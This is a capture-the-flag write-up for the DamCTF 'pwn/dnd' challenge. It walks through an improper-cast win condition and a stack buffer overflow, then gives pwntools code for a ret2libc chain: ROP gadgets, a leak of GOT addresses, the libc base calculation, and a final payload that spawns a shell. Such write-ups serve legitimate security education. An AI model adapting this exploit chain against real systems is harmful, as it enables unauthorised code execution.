# pwn/dnd
by captainGeech

150 solves / 404 points

> Dungeons and Dragons is fun, but this is DamCTF! Come play our version
> 
> `nc dnd.chals.damctf.xyz 30813`
>
> [dnd.zip](dnd.zip)
> 

## Overview
This challenge is a pwn ret2libc via buffer overflow challenge, preluded by a simple game with an improper cast bug.

## Writeup

This is what the zip file contains:

```plaintext
dnd.zip
├── dnd
├── ld-linux-x86-64.so.2
└── libc.so.6
```

The `dnd` binary is a 64-bit ELF file. It is a simple game where you choose whether to fight or avoid an enemy, collecting points along the way. 

```
##### Welcome to the DamCTF and Dragons (DnD) simulator #####
Can you survive all 5 rounds?

>>> Round 1
Points: 0 | Health: 10 | Attack: 5
New enemy! You are now facing off against: Skittershank the Gremlin (2 health, 1 damage)
Do you want to [a]ttack or [r]un? 
```

Interestingly, sometimes after a fight, points can become a negative integer. If the game ends with the points in the negative, the game thinks you've won. 

```cpp
bool Game::DidWin() {
	return 99 < points; // unsigned comparison
}
```

Running instead of attacking will not change your points, so the main win tactic is simply to attack until points become negative, and then running away at all subsequent rounds.

Upon winning, the game asks for your name and fails to prevent a buffer overflow:

```
Congratulations! Minstrals will sing of your triumphs for millenia to come.
What is your name, fierce warrior? 
```

```cpp
void win() {
	char warrior_name [32];
	std::cout << "Congratulations! Minstrals will sing of your triumphs for millenia to co me." << std::endl;
	std::cout << "What is your name, fierce warrior? ";

	fgets(warrior_name, 256, stdin); // <- buffer overflow

	// ...
}
```

PIE and canaries are disabled in the binary

```
>>> from pwn import *
>>> elf = ELF('dnd')
[*] 'dnd'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found   # !
    NX:         NX enabled
    PIE:        No PIE (0x400000) # !
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

But no functions in `dnd` call any interesting functions, but since it uses `libc.so.6`, we can use ret2libc to get a shell.

> My most useful resource in executing this is RazviOverflow's video
> 
> [![Exploiting Return to Libc (ret2libc) tutorial - pwn109 - PWN101 | TryHackMe](docs-img/ret2libc-vid.jpg)](https://www.youtube.com/watch?v=TTCz3kMutSs)

### ret2libc

The end goal is to call `system("/bin/sh")`.

First, the two ROP gadgets used were found using ROPgadget:

```
0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret
0x000000000040201a : ret
```

With RDI control, we invoke `puts` to leak the address of libc functions from the global offset table (GOT) imported in `dnd`, namely `fgets`, `puts`, and `rand`—leaking several addresses lets us crosscheck leaked results.

```python
elf = ELF('./dnd')

pop_rdi_pop_rbp_ret = p64(0x0000000000402640) # pop rdi ; nop ; pop rbp ; ret
ret = p64(0x000000000040201a) # ret

plt_puts_addr = p64(elf.plt.puts)
got_puts_addr = p64(elf.got.puts)
got_fgets_addr = p64(elf.got.fgets)
got_rand_addr = p64(elf.got.rand)
main_fn_addr = p64(0x00402988)

dummy_rbp = b'B' * 8

payload = flat(
    b'A' * 0x68,
    pop_rdi_pop_rbp_ret + got_puts_addr + dummy_rbp + plt_puts_addr,
    pop_rdi_pop_rbp_ret + got_fgets_addr + dummy_rbp + plt_puts_addr,
    pop_rdi_pop_rbp_ret + got_rand_addr + dummy_rbp + plt_puts_addr,
		main_fn_addr, # call main() again for later
    b'\0',
)

shell.sendline(payload) # GO

shell.recvuntil(b'A' * 32) # consume warrior name
output = shell.recvuntil(b'##### Welcome to the DamCTF and Dragons').split(b'\n')

leaked_puts_addr = u64(output[1].ljust(8, b'\x00'))
leaked_fgets_addr = u64(output[2].ljust(8, b'\x00'))
leaked_rand_addr = u64(output[3].ljust(8, b'\x00'))
```

Oddly, the address for `puts` is mangled, so we rely on `fgets` and `rand`. Their addresses are compared with the libc file provided in the zip file, and the offsets are calculated. 

```python
libc = ELF('./libc.so.6')
libc_base = leaked_fgets_addr - libc.symbols['fgets']

system_addr = libc_base + libc.symbols['system']
fgets_addr = libc_base + libc.symbols['fgets']
rand_addr = libc_base + libc.symbols['rand']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

print('Got dynamic addresses:')
print(f' - system: {hex(system_addr)}')
print(f' - fgets: {hex(fgets_addr)}')
print(f' - rand: {hex(rand_addr)}')
print(f' - bin_sh: {hex(bin_sh_addr)}')
print(f' - offset: {libc_base}')
```

With the final addresses to call `system("/bin/sh")`, we can build the final payload and send it without restarting the connection and reshuffling the libc address randomization, which we can do because we had previously made `dnd` return to `main()` to play the game again. 

A `ret` instruction is added to align the stack (the number of `ret`s is determined by trial and error). 

```python
payload = flat(
    b'A' * 0x68,
    ret, # align stack
    pop_rdi_pop_rbp_ret + p64(bin_sh_addr) + dummy_rbp + p64(system_addr),
    b'\0',
)

shell.sendline(payload)
shell.interactive()
```

Voila!

```
dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}
```

The full exploit is in `solve.py`.
